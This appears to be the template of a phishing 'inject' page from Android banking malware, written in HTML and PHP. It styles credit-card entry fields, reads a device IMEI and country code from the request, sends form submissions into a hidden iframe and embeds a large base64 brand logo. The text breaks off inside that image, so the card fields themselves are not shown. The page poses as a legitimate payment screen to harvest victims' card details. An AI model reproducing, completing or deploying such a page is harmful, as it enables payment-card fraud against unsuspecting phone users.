<html>
	<head>
		<meta name="viewport" content="width=device-width,height=device-height, initial-scale=1.0, user-scalable=yes, maximum-scale=1.0" />
<style type="text/css">
    select {
        outline: none;
        -webkit-appearance: none;
    }

	.button {
		-moz-box-shadow: inset 0px 1px 0px 0px #7a8eb9;
		-webkit-box-shadow: inset 0px 1px 0px 0px #FFFFFF;
		box-shadow: inset 0px 1px 0px 0px #00AEEF;
		background-color: #00AEEF;
		display: inline-block;
		border: 0;
		cursor: pointer;
		color: #FFFFFF;
		font-family: Arial;
		text-align: center;
		padding: 7px;
		width: 56%;
		font-size: 18px;
		font-weight: lighter;
	}

	.button:hover {
		background-color: #00A2DE;
		box-shadow: inset 0px 1px 0px 0px #00A2DE;
		color: #FFFFFF;
	}

	.button:active {
		position: relative;
		top: 1px;
	}

	::-webkit-input-placeholder {
		color: #000;
		font-size: 14px;
	}

	:-moz-placeholder {
		color: #000;
		font-size: 14px;
	}

	::-moz-placeholder {
		color: #000;
		font-size: 14px;
	}

	:-ms-input-placeholder {
		color: #000;
		font-size: 14px;
	}

	.bodyclass {
		background: #f3f3f3;
		color: #000;
	}

	.field {
		background-color: #FFFFFF;
		width: 56%;
		color: #000000;
		padding: 0 0 0 7px;
		margin-bottom: 2px;
		border: 1px solid grey;
		border-radius: 5px;
		height: 35px;
	}

	.field3 {
		background-color: #FFFFFF;
		outline: none;
		border: 1px solid grey;
		border-radius: 5px;
		width: 21.6%;
		margin-left: 0%;
		color: #000000;
		height: 35px;
		margin-bottom: 2px;
	}

	.fielderror {
		background-color: #FFFFFF;
		width: 56%;
		color: #000000;
		padding: 0 0 0 7px;
		border: 1px solid #f00;
		border-radius: 5px;
		margin-bottom: 2px;
		height: 35px;
	}

	.fielderror2 {
		background-color: #FFFFFF;
		outline: none;
		border: 1px solid #f00;
		border-radius: 5px;
		width: 28%;
		height: 35px;
		padding: 0 0 0 7px;
		color: #000000;
	}

	.fielderror3 {
		background-color: #FFFFFF;
		outline: none;
		border: 1px solid #f00;
		border-radius: 5px;
		width: 17.6%;
		margin-left: 0%;
		color: #000000;
		height: 35px;
		margin-bottom: 2px;
	}

	.field1 {
		background-color: #FFFFFF;
		outline: none;
		border: 1px solid grey;
		border-radius: 5px;
		width: 28%;
		margin-left: -0.3%;
		height: 35px;
		padding: 0 0 0 7px;
		margin-right: 0px;
		color: #000000;
	}

	div.container {
		margin-left: 0%;
		margin-right: 0%;
	}

	.cc-type-icon-container {
		margin-left: 5px;
		height: 50px;
	}

	.cc-type-icon-container > img {
		display: none;
	}
</style>
	</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>

	<body class="bodyclass">
		<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>

		<form action="null" method="post" id="_mainForm" target="flow_handler">
			<center>
			<img style="max-width: 100%" src="data:image/png;base64,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